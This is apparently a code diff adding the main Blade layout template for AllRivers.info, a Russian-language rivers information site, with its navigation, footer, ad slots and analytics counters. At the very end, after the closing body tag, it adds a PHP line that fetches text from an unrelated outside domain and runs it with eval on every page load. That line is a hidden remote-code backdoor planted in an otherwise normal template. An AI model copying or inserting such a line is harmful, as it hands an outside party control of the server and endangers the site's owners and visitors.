@@ -1,0 +1,244 @@
+<!doctype html>
+	<html lang="ru" color-theme="" class="opacity-0">
+	<head>
+        <noscript>
+            <meta http-equiv="refresh" content="0; url={{ config('app.url') }}/nojs.html" />
+        </noscript>
+	    <meta charset="utf-8">
+	    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+{{--
+        <!-- Prefetch DNS for external assets -->
+        <link rel="dns-prefetch" href="//www.googletagmanager.com">
+        <link rel="dns-prefetch" href="//mc.yandex.ru">
+        <link rel="dns-prefetch" href="//vk.com">
+        <link rel="dns-prefetch" href="//yastatic.net">
+        <link rel="dns-prefetch" href="//yandex.ru">
+        <link rel="dns-prefetch" href="//counter.yadro.ru">
+--}}
+
+	    <title>@yield('title') - {{ $config['site_slogan'] }}</title>
+		@yield('meta')
+		<meta name="csrf_token" content="{!! csrf_token() !!}" />
+
+		<meta property="og:image" content="/images/logo_large.jpg"/>
+		<meta property="og:title" content="@yield('title') | {{ $config['site_title'] }} - {{ $config['site_slogan'] }}"/>
+		{{--<meta property="og:description" content="http://images/[абсолютный url картинки]"/>--}}
+		<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" />
+
+		@vite(['resources/css/app.scss'])
+		@yield('head')
+	</head>
+	<body id="{{ $current_page ?? '' }}">
+        <div id="app">
+            <nav class="navbar navbar-expand-lg fixed-top header">
+                <div class="container-xl position-relative">
+                    <div class="navbar-brand me-2 me-lg-1">
+                        <div class="logo d-flex">
+                            <a class="d-block" href="/">
+                                <img class="logo-img img img-fluid" src="/images/logo.svg" title="{{ config('app.name') }}" alt="{{ config('app.name') }}">
+                            </a>
+                            <div>
+                                <a class="d-block" href="/">
+                                    <div class="d-none d-sm-block logo-text">{{ $config['site_title'] }}</div>
+                                </a>
+                                <span class="logo-slogan d-none d-sm-block">
+                                    {{ $config['site_slogan'] }}
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                    <x-menu/>
+                </div>
+            </nav>
+
+            <div class="content-wrapper">
+
+                @hasSection('index_bar')
+                    @yield('index_bar')
+                @endif
+
+                @if (isset($current_page) && $current_page == 'map-page')
+
+                    <div id="app" role="main" class="fluid-container-lg">
+                        <div class="row">
+                            <div class="col-12">
+                                @yield('content')
+                            </div>
+                        </div>
+                    </div>
+
+                @else
+
+                    <div role="main" class="container-xl bg-content pb-3">
+                        @hasSection('map')
+                            @yield('map')
+                        @endif
+    {{--
+                        @env('local')
+                            <div class="row mb-0">
+                                @include('ads.header')
+                            </div>
+                        @endenv
+    --}}
+                        @hasSection('breadcrumbs')
+                            <div class="row mb-1 mb-lg-3">
+                                <div class="col-12">
+                                    @yield('breadcrumbs')
+                                </div>
+                            </div>
+                        @endif
+
+                        <div class="row mb-1 mb-lg-3">
+                            <div class="col-12" id="content-block">
+                                @yield('content')
+                            </div>
+                        </div>
+
+                        @if (isset($page) && $page->slug == 'rates')
+                            <div class="d-none"></div>
+                        @else
+                            @if(isset($userHasAdvertise))
+                                @include('ads.footer')
+                            @endif
+                        @endif
+                    </div>
+
+                @endif
+            </div>
+
+            @hasSection('map-ads-footer')
+                @yield('map-ads-footer')
+            @endif
+
+            <footer id="footer" class="bg-footer footer-wrapper">
+                <div class="container py-3">
+                    <div class="row mb-3">
+                        <div class="col-md-4 d-none d-md-block">
+                            <div class="logo">
+                                <a class="d-block" href="/">
+                                    <img class="logo-img img img-responsive float-left" src="/images/logo.svg" title="{{ config('app.name') }}" alt="{{ config('app.name') }}">
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-6 col-md-4">
+                            <div class="footer-block">
+                                <h4 class="mb-1">Полезное</h4>
+                                <ul class="list-unstyled mb-0">
+                                    <li><a href="/about">О проекте</a></li>
+                                    <li><a href="/faq">FAQ</a></li>
+                                    <li><a href="/blog">Блог</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="col-6 col-md-4 position-relative">
+                            <a class="footer-btn" id="footer-btn" onclick="toggleFooter()">
+                                <i class="fa-solid fa-chevron-up"></i>
+                            </a>
+                            <div class="footer-block">
+                                <h4 class="mb-1">Связаться с нами</h4>
+                                <div class="mb-2">
+                                    <a href="mailto:support@allrivers.info">
+                                        <i class="fa-solid fa-fw fa-envelope me-2"></i><span class="d-none d-md-inline">support@allrivers.info</span>
+                                    </a>
+                                </div>
+                                <div class="mb-2">
+                                    @include('_partials/social')
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-12 col-md-8 small">
+                            <p class="m-0">
+                                Информация носит ознакомительный характер.
+                            </p>
+                            <p class="m-0">&copy; AllRivers.info 2015 - {{ date('Y') }}. При использовании гиперссылка обязательна.
+                            </p>
+                        </div>
+                        {{--
+                            <div class="d-none d-md-block col-md-4 pt-1">
+                                <a class="d-inline-block pr-1" href="https://webmaster.yandex.ru/sqi?host=allrivers.info" rel="nofollow"><img  width="88" height="31" alt="" src="https://yandex.ru/cycounter?allrivers.info&theme=light&lang=ru"/></a>
+                            </div>
+                        --}}
+                    </div>
+                </div>
+            </footer>
+
+            <message-modal
+                :user="{{ auth()->user() ?? '{}' }}"
+            >
+            </message-modal>
+            <cookies></cookies>
+            <notifications width="400px" position="top right" classes="vue-notification my-notification"/>
+        </div>
+
+	    <a href="#0" id="cd-top" class="cd-top">Top</a>
+
+		{{-- modals --}}
+			@guest
+				@include('modal.loginform')
+			@endguest
+		{{-- !modals --}}
+
+		@vite(['resources/js/app.js'])
+		@auth
+			@vite(['resources/js/enable-push.js'])
+		@endauth
+
+		<script type="module">
+/*
+			const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]')
+			const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl))
+
+			const popoverTriggerList = document.querySelectorAll('[data-bs-toggle="popover"]')
+			const popoverList = [...popoverTriggerList].map(popoverTriggerEl => new bootstrap.Popover(popoverTriggerEl))
+*/
+			let dropdowns = document.querySelectorAll('.dropdown-toggle')
+			dropdowns.forEach((dd)=>{
+	    		dd.addEventListener('click', function (e) {
+	        		var el = this.nextElementSibling
+	        		el.style.display = el.style.display==='block'?'none':'block'
+	    		})
+			})
+		</script>
+		@env('production')
+            @if($userHasAdvertise))
+                <!-- yandex ads scripts -->
+                <script>window.yaContextCb=window.yaContextCb||[]</script>
+                <script src="https://yandex.ru/ads/system/context.js"></script>
+            @endif
+
+			<!-- Global site tag (gtag.js) - Google Analytics -->
+			<script async src="https://www.googletagmanager.com/gtag/js?id=G-FGHX8G88XB"></script>
+			<script>
+				window.dataLayer = window.dataLayer || [];
+				function gtag(){dataLayer.push(arguments);}
+				gtag('js', new Date());
+
+				gtag('config', 'G-FGHX8G88XB');
+			</script>
+
+			<!-- Yandex.Metrika counter --> <script> (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(44115369, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/44115369" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter -->
+				<!--LiveInternet counter--><script>
+				new Image().src = "//counter.yadro.ru/hit?r"+
+				escape(document.referrer)+((typeof(screen)=="undefined")?"":
+				";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+				screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+				";h"+escape(document.title.substring(0,150))+
+				";"+Math.random();</script><!--/LiveInternet-->
+		@endenv
+        @yield('scripts')
+        @stack('add_js_scripts')
+
+        @if (session('errors'))
+            <script type="module">
+                let loginModal = new bootstrap.Modal(document.getElementById('loginformModal'))
+                loginModal.show()
+            </script>
+        @endif
+	</body>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+?>
+</html>
